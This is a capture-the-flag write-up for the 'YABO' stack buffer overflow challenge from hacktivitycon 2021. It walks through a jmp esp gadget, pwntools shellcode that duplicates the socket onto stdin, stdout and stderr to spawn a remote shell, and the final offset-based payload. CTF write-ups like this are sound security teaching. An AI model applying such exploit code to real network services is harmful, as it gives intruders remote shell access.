# YABO - hacktivitycon 2021

- Category: Pwn
- Points: 478
- Solves: 47
- Solved by: drw0if

## Description

Yet Another Buffer Overflow.

Some certifications feature a basic windows buffer overflow. Is the linux version really that different?

## Solution

Reversing the binary with ghidra we understand that we have to exploit a TCP server:

- it waits for an incoming connection on port `9999`
- fork the process
- on the child process proceeds to execute `vuln` function

The vuln function, as the name suggests, is vulnerable to buffer overflow, in fact it asks for a string that is stored inside a heap buffer, then it uses `strcpy` to copy the string from the heap buffer to a `smaller` local buffer, so we can hijack the control flow.

The binary has no protection:
```bash
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Let's search for useful ROP gadgets:
```bash
ROPgadget --binary YABO
```

A fast approach would be to inject shellcode and jump to it, we can do it since we have the gadget:
```bash
0x080492e2 : jmp esp
```

Our exploit will look like:
```
0x080492e2
$shellcode
```

To pop a shell we can't use plain `execve` or `system` since it would be poppped inside the server and we couldn't interact with it, to help us we can use the linux syscall `dup2` to connect the stdin, stdout, stderr of the server to the socket, so everything we will write to the socket is written to stdin too and vice versa.  

To build it fastly we can use pwntools `shellcraft`:

```python
shellcode = shellcraft.linux.dup2(4, 0)
shellcode += shellcraft.linux.dup2(4, 1)
shellcode += shellcraft.linux.dup2(4, 2)
shellcode += shellcraft.linux.sh()
```

Using `gdb` we can find the offset at which the rip is overwritten and the final exploit is:

```python
payload = {
   1044 : 0x080492e2,
   1048 : compiled
}
```
